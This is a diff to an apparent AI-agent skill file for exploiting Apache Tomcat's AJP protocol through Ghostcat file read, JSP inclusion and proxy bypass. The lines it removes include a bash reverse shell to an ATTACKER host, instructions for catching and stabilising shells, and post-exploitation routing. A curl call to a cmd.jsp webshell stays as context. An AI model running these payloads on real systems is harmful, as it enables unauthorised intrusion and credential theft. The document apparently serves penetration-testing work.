@@ -53,13 +53,11 @@ When an engagement directory exists:
 This skill covers AJP protocol exploitation — Ghostcat file read, AJP attribute
 injection for JSP inclusion, and AJP proxy bypass to access restricted Tomcat
 management interfaces. When you reach the boundary of this scope — whether
-through a routing instruction ("Route to **skill-name**") or by discovering
-findings outside your domain — **STOP**.
+through completing your methodology or discovering findings outside your domain — **STOP**.
 
 Do not load or execute another skill. Do not continue past your scope boundary.
 Instead, return to the orchestrator with:
   - What was found (vulns, credentials, access gained)
-  - Recommended next skill (the bold **skill-name** from routing instructions)
   - Context to pass (injection point, target, working payloads, etc.)
 
 The orchestrator decides what runs next. Your job is to execute this skill
@@ -496,80 +494,6 @@ curl "http://127.0.0.1:8888/cmd/cmd.jsp?cmd=id"
 ```
 
 ## Step 6: Escalate or Pivot
-
-### Reverse Shell via MCP
-
-When RCE is confirmed, **prefer catching a reverse shell via the MCP
-shell-server** over continuing to execute commands through JSP inclusion or
-WAR deployment.
-
-1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
-2. Send a reverse shell payload through the JSP webshell or WAR command execution:
-   ```bash
-   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
-   ```
-3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
-4. Use `send_command()` for all subsequent commands
-
-If the target lacks outbound connectivity, continue with inline command
-execution and note the limitation in the engagement state.
-
-After completing this technique:
-
-- **Got credentials from web.xml / application.properties**: Test against SSH,
-  databases, other services. STOP. Return to orchestrator recommending the
-  relevant skill. Pass: extracted credentials, target services.
-- **Got RCE via JSP inclusion or WAR deploy**: Stabilize the shell, then STOP.
-  Return to orchestrator recommending **linux-discovery** or **windows-discovery**
-  (based on target OS). Pass: shell type, access level, target OS. Do not
-  perform post-exploitation inline.
-- **Found database credentials in config files**: Return to orchestrator
-  recommending the appropriate database exploitation skill. Pass: DBMS type,
-  connection string, credentials.
-- **Found internal services via config files** (e.g., internal URLs, API
-  endpoints): Return to orchestrator recommending **web-discovery**. Pass:
-  discovered URLs and services.
-- **AJP blocked by requiredSecret**: Note in Blocked section. If HTTP is also
-  available, return to orchestrator recommending **web-discovery** for
-  HTTP-based testing.
-
-When routing, always pass along: target, AJP port, Tomcat version, files read,
-credentials found, and what worked.
-
-## Stall Detection
-
-If you have spent **5 or more tool-calling rounds** on the same failure with
-no meaningful progress — same error, no new information, no change in output
-— **stop**.
-
-**What counts as progress:**
-- Trying a variant or alternative **documented in this skill**
-- Adjusting syntax, flags, or parameters per the Troubleshooting section
-- Gaining new diagnostic information (different error, partial success)
-
-**What does NOT count as progress:**
-- Writing custom exploit code not provided in this skill
-- Inventing workarounds using techniques from other domains
-- Retrying the same command with trivially different input
-- Compiling or transferring tools not mentioned in this skill
-
-If you find yourself writing code that isn't in this skill, you have left
-methodology. That is a stall.
-
-Do not loop. Work through failures systematically:
-1. Try each variant or alternative **once**
-2. Check the Troubleshooting section for known fixes
-3. If nothing works after 5 rounds, you are stalled
-
-**When stalled, return to the orchestrator immediately with:**
-- What was attempted (commands, variants, alternatives tried)
-- What failed and why (error messages, empty responses, timeouts)
-- Assessment: **blocked** (permanent — config, patched, missing prereq) or
-  **retry-later** (may work with different context, creds, or access)
-
-**When stalled:** Tell the user you're stalled, present what was tried, and
-recommend the next best path. Return findings to the orchestrator — it will
-decide whether to revisit with new context or route elsewhere.
 
 ## OPSEC Notes
 
